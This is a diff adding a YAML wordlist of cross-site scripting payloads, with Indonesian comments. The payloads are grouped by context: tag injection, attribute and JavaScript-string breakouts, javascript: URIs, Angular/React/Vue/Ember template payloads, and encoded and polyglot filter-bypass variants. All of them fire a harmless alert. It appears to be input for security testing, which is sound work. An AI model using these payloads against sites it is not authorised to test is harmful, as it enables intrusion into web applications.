@@ -1,0 +1,87 @@
+# payloads.yml
+#
+# Kumpulan payload XSS yang umum digunakan, dikelompokkan berdasarkan tipe.
+# Anda dapat menambah, menghapus, atau memodifikasi sesuai kebutuhan.
+
+html_tag_injection:
+  - "<script>alert(1)</script>"
+  - "<img src=x onerror=alert(1)>"
+  - "<svg onload=alert(1)>"
+  - "<details open ontoggle=alert(1)></details>"
+  - "<video><source onerror=alert(1)></video>"
+  - "<math><mtext><img src=x onerror=alert(1)></mtext></math>"
+  - "<iframe src=javascript:alert(1)>"
+  - "<form action=javascript:alert(1)><button>Click</button></form>"
+
+html_attribute_breakout_dq:
+  - "\" onmouseover=\"alert(1)\" \""
+  - "\" autofocus onfocus=alert(1) \""
+  - "\" style=\"x\" onload=\"alert(1)\" \""
+  - "\" value=\"\" onclick=\"alert(1)\" \""
+
+html_attribute_breakout_sq:
+  - "' onmouseover='alert(1)' '"
+  - "' autofocus onfocus='alert(1)' '"
+  - "' style='x' onload='alert(1)' '"
+  - "' value='' onclick='alert(1)' '"
+
+html_attribute_unquoted_breakout:
+  - " autofocus onfocus=alert(1) data=x "
+  - " onmouseover=alert(1) data-test=1 "
+  - " src=x onerror=alert(1) data=test "
+
+js_string_breakout_dq:
+  - "\"; alert(1);//"
+  - "\";eval('alert(1)');//"
+  - "\";location='javascript:alert(1)';//"
+
+js_string_breakout_sq:
+  - "'; alert(1);//"
+  - "';eval('alert(1)');//"
+  - "';location='javascript:alert(1)';//"
+
+js_uri_scheme:
+  - "javascript:alert(1)"
+  - "javascript:eval('alert(1)')"
+  - "javascript:prompt(1)"
+  - "javascript:confirm(1)"
+
+# Payload untuk framework‐spesifik (opsional)
+frameworks:
+  angular:
+    - "{{constructor.constructor('alert(1)')()}}"
+    - "{{7*7}}"
+    - "{{::true}}"
+    - "<div ng-app ng-csp>{{alert(1)}}</div>"
+  react:
+    - "<img src=x onerror={alert(1)}>"
+    - "<svg onload={alert(1)}>"
+    - "<button onclick={alert(1)}>Click</button>"
+  vue:
+    - "<div v-bind:attr=\"`onerror=alert(1)`\"><img src=x></div>"
+    - "<img :src=\"`x`\" @error=\"alert(1)\">"
+  ember:
+    - "{{getAppRoot().lookup('controller:application').transitionTo('alert(1)')}}"
+    - "<div {{action \"alert\"}}>Click</div>"
+
+# Payload HTML‐encoded (untuk bypass filter dasar)
+encoded:
+  - "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  - "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+  - "%3Csvg%20onload%3Dalert(1)%3E"
+
+# Payload “polyglot” untuk berbagai konteks
+polyglot:
+  - "<svg/ onload=alert`1`>"
+  - "<svg/onload=alert(1)>"
+  - "<script%0a>alert(1)</script>"
+  - "<scr<script>ipt>alert(1)</scr<script>ipt>"
+  - "<scr<script/>ipt>alert(1)</script>"
+
+# Payload non‐classic tapi kadang berhasil di filter ketat
+alternate_payloads:
+  - "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>"
+  - "<svg><script x='>'>alert(1)</script>"
+  - "<svg><script><![CDATA[alert(1)]]></script>"
+  - "<iframe/src=javascript:alert(1)>"
+  - "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
